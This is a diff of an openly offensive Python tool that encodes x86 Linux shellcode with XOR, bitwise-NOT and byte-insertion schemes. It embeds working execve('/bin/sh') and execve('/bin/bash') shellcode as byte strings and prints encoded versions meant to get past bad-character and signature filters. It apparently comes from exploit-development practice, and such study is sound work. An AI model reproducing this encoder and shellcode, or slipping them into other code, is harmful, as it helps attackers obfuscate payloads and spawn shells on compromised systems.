@@ -1,26 +1,30 @@
 #!/usr/bin/python3
 
-# Shellcode XOR byte Encoderi
+# Shellcode XOR, NOT byte Encoder
 
 # TODO
 #
 #1- option to generate new key with the same instanced object using a random key;
-#2- bad xor key byte - generate a key byte that is not present in the shellcode. this will result in a null byte; 
+#2- bad xor key byte - generate a key byte that is not present in the shellcode. this will result in a null byte and be the marker to stop the converting operation; 
 
 import argparse
 import secrets
 import logging
+import sys
 
+#parser = argparse.ArgumentParser(description='[*] Miscellaneous Shellcode Encoder.')
+#parser.add_argument('string', metavar='string', type=ascii, help='The string to be converted')
 
+#args = parser.parse_args()
 
 #logging.basicConfig(level=logging.DEBUG)
 #logging.basicConfig(level=logging.INFO)
 
 secretsGenerator = secrets.SystemRandom()
 
-c_style_shellcode = (b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/bash - execve stack technique shellcode -> execve(/bin/bash,/bin/bash,0)
+#c_style_shellcode = (b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/bash - execve stack technique shellcode -> execve(/bin/bash,/bin/bash,0)
 
-#c_style_shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/sh
+c_style_shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/sh
 
 #c_style_shellcode = b"\x31\xc1"
 
@@ -42,7 +46,7 @@ def banner():
 #----------------------------
 
 
-class xorEncoder:
+class Encoder:
 
     def randomKeyGenerator(self):
         byte = '0x'
@@ -57,18 +61,20 @@ class xorEncoder:
         return int(byte,16) # convert key to bytes and return
 
 
-    def __init__(self, key=None):
-        if key is not None:
-            self.key = key
-            print("[*] Key Provided. Doing magic with it")
-        else:
-            self.key = self.randomKeyGenerator()
-            print("[*] Doing magic with a (pseudo) Random key")
-        print("[*] Key: "+hex(self.key))
+    def __init__(self,enc_type, key=None):
+        if enc_type != "not":
+            
+            if key is not None:
+                self.key = key
+                print("[*] Key Provided. Doing magic with it")
+            else:
+                self.key = self.randomKeyGenerator()
+                print("[*] Doing magic with a (pseudo) Random key")
+            print("[*] Key: "+hex(self.key))
    
     
     # xor encoding in \x format (\x56\xbd\xca,...)
-    def encoding_backslashX(self,shellcode):
+    def xor_encoding_backslashX(self,shellcode):
         logging.debug(shellcode)
         encoded = ''
         
@@ -84,8 +90,8 @@ class xorEncoder:
         print(encoded)
 
 
-    # xor encoding in 0x output format (0x56,0xbd,0xca,...)
-    def encoding_0x(self,shellcode):
+    # xor encoding in 0x output format (thex56,0xbd,0xca,...)
+    def xor_encoding_0x(self,shellcode):
         logging.debug(shellcode)
         encoded = ''
 
@@ -100,6 +106,42 @@ class xorEncoder:
         print(encoded[:-1])
 
 
+    # two's complement is the inverse representation of a NOT operation
+    def complement_encoding(self, shellcode): 
+        encoded = '' # 0x format
+        encoded2 = '' # \x format
+
+        for shellbyte in shellcode:
+            logging.info("Shellbyte type - "+str(shellbyte))
+            encoded_byte = ~shellbyte  # not bitwise operation
+            encoded += hex(encoded_byte & 0xff) + ','
+
+            encoded2 += '\\x' + hex(encoded_byte & 0xff)[2:] # \x format
+
+        print("\n[*] \\x format: ")
+        print(encoded2)
+            
+        print("\n[*] 0x format: ")
+        print(encoded[:-1])
+    
+    def insertion_encode(self, shellcode):
+
+        encoded = '' # 0x format
+        encoded2 = '' # \x format
+
+        for shellbyte in shellcode:
+            logging.info("Shellbyte type - "+str(shellbyte))
+            encoded += hex(shellbyte) + ',' + hex(self.key)  + ','
+
+
+            encoded2 += '\\x' + hex(shellbyte)[2:] + '\\x' + hex(self.key)[2:] # \x format
+
+        print("\n[*] \\x format: ")
+        print(encoded2)
+            
+        print("\n[*] 0x format: ")
+        print(encoded[:-1])
+
 
 
 def main():
@@ -108,23 +150,51 @@ def main():
     print("[*] Shellcode length: "+str(len(shellcode))+"\n")
     print("[*] Shellcode: "+str(c_style_shellcode)+"\n")
 
+
+
     # -------------------KEY-------------- 
     key = 0xaa
     #key = None
     #####################################
 
+    # -------------Encode Type-----------
+    enc_type = "xor"
+    #####################################
+
+
+
+
     #if key is not None:
      #   key = bytes.fromhex(key)
       #  logging.debug(key)
-
-    xor_enc = xorEncoder(key)
-    xor_enc.encoding_backslashX(shellcode)# utf-8 encoding (\x4b,\xe4,...)
-    xor_enc.encoding_0x(shellcode) # hex format (0x4b, 0xe4,...)
     
+    if enc_type == "not":
+
+        encoder = Encoder(enc_type)
+        encoder.complement_encoding(shellcode)
+
+    elif enc_type == "xor":
+    
+        encoder = Encoder(enc_type, key)
+        encoder.xor_encoding_backslashX(shellcode)# utf-8 encoding (\x4b,\xe4,...)
+        encoder.xor_encoding_0x(shellcode) # hex format (0x4b, 0xe4,...)
+    
+    elif enc_type == "insertion":
+        encoder = Encoder(enc_type, key)
+        encoder.insertion_encode(shellcode)
+           
+    else:
+        print("[*] Encode type not supported. Please check the supported algorithms in the help menu")
+        #sys.exit()
+
+
+
+
 
 
 if __name__ == '__main__':
-    banner()    # displays the program banner
+
+    banner() # displays the program banner
     main()
     print("\n--------------------")
     print("[*] Hack the World!")
